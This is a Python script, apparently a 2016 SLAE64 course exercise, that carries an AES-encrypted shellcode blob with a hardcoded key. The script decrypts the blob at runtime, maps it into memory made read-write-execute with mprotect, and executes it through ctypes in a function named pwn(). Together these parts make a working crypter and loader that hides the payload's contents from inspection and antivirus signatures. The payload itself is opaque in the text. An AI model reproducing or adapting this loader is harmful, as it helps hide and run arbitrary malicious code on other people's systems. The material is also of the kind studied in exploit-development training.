#!/usr/bin/env python

####################################################
#
# shellcode-decrypter.py
# by Michael Born (@blu3gl0w13)
# Student ID: SLAE64-1439
# November 8, 2016
#
####################################################

# Imports

from Crypto.Cipher import AES
import sys
#import argparse
import os
import hashlib
from ctypes import *


#---------------------------------------
#
# Define our Decryption Functions
#
#--------------------------------------


def aesDecrypter(key, IV, shellcode, salt):
  hashedKey = hashlib.sha256(key + salt).digest()
  mode = AES.MODE_CBC
  initVector = IV
  decrypterObject = AES.new(hashedKey, AES.MODE_CBC, initVector)
  messageToDecrypt = shellcode
  clearText = decrypterObject.decrypt(messageToDecrypt)
  #print "\n\n[+] RAW AES Decrypted Shellcode (non hex encoded): \n\"%s\"\n\n" % clearText
  return clearText
  sys.exit(0)

def pwn():
  # Setup the argument parser

#  parser = argparse.ArgumentParser()
#  parser.add_argument("-s", "--shellcode", help="Shellcode to encrypt", dest='shellcode', required=True)
#  parser.add_argument('-k', '--key', help='AES key to use for encryption', dest='key', required=True)
#  options = parser.parse_args()


  # Prepare some objects
  encryptedPayload = "\xa3\x39\x74\x0a\xf3\x66\x25\xad\x99\xb7\xb1\xa2\x5f\x8f\xfe\x46\xc0\xca\xd7\xb3\x2d\x07\x04\xe0\x3a\x2f\x18\xbf\x4c\x12\x70\xe1\xe7\xda\x39\x2f\x1d\x8a\x19\xc3\x5f\xb0\xeb\x11\xd0\x19\xa6\x1d\x91\x08\xb0\x5c\xc9\x5a\x21\xd9\xc2\xc9\x5a\xce\x1d\x96\x7e\xa4\xa0\x68\xad\xd7\x9d\x89\x1e\x93\x03\xef\xfc\xe1\xed\xfd\x01\x2e\xb7\xb8\x99\x58\xee\x1b\xaa\xbd\xa1\x99\xe7\x61\xbc\xaa\xd2\x4c\x7e\x7f\x5c\xc4\x13\xc2\xb6\x13\xaf\xad\x34\xb1\x9e\x13\x79\x12\x6c\x9f\x46\xde\xd1\x37\xd7\xc8\x8e\xcb\x44\x8d\x5d\x9e\xbd\xe3\x65\x33\x06\x87\x25\xc7\xa5\x9e\x97\x25\xd3\x62\xa7\xbb\x10\xf5\x3b\x5a\x84\x6c\x8e\x14\x62\xe3\x85\x80\xe6\x59\xa5\x99\x03\x96\x0e\x6e\xdc\x20\x01\x9e\xa0\xdf\x1b\xc5\xd0\x2b\xc8\x59\x0f\x00\x1e\xa3\x7b\x95\x22\xd5\x32\x5b\xf1\x6a\x39\x9d\xfb\xf6\xf6\xc5\xc2\xb9\x70\xa0\xd3\x9b\xe6\x36\xf1\xe8\xad\xdd\x30\x41\xca\xf0\x6c\x7b\x73\xc6\x43\x00\x0b\x6c\x6c\x4f\x53\xfc\x64\x8b\x93\xfa\x4f\x33\x66\x58\xe3\x18\x2d\x50\xe8\x90\xed\x89\xa2\xf9\x73\xbf\x1e\x2e\x1d\x18\x45\x9a\x6f\x70\x75\x91\x78\xcc\xa9\x99\x51\x2a\xb0\x03\x12\x23\x95\x1b\x6a\x79\x30\x9a\x6b\x95\x2b\x94\x61\x87\x41\x54\xc5\x15\x62\x74\x6e\xc7\xd6\xff\xde\x08\x21\x26\xf0\x97\x86\x91\xbe\xa6\x2a\xa4\xa9\x8c\x00\x82\x5e\x91\x3c\xf8\xf6\xf9\x18\x7f\xa8\x06\xe2\x0b\xf5\x00\x9c\xb4\xaf\xf1\x89\xa6\xb4\xb7"


#  encryptedPayload = (options.shellcode).replace("\\x", "").decode('hex')
  IV = encryptedPayload[:16]
  salt = encryptedPayload[16:32]
  key = 'slae64'
  shellcode = encryptedPayload[32::]

  decrypted = aesDecrypter(key, IV, shellcode, salt)


  # now we need to run our shellcode from here

  # use ctypes.CDLL to load /lib/i386-linux-gnu/libc.so.6

  libC = CDLL('libc.so.6')

  #print decrypted
#  shellcode = str(decrypted)
#  shellcode = shellcode.replace('\\x', '').decode('hex')


#  code = c_char_p(shellcode)

  code = c_char_p(decrypted)
#  sizeOfDecryptedShellcode = len(shellcode)
  sizeOfDecryptedShellcode = len(decrypted)

  # now we need to setup our void *valloc(size_t size) and get our pointer to allocated memory

  memAddrPointer = c_void_p(libC.valloc(sizeOfDecryptedShellcode))

  # now we need to move our code into memory using memmove 
  # void *memmove(void *dest, const void *src, size_t n)

  codeMovePointer = memmove(memAddrPointer, code, sizeOfDecryptedShellcode)


  # now we use mprotect to make sure we have read, write, and execute permisions in memory
  # R, WR, X = 0x7

  protectMemory = libC.mprotect(memAddrPointer, sizeOfDecryptedShellcode, 7)
#  print protectMemory

  # now we set up a quick execution for our shellcode using cast ctypes.cast = cast(obj, typ)
  # we'll have to call ctypes.CFUNCTYPE to identify memAddrPointer as void * (c_void_p) type

  executeIt = cast(memAddrPointer, CFUNCTYPE(c_void_p))
#  print run
  executeIt()



if __name__ == "__main__":
  pwn()
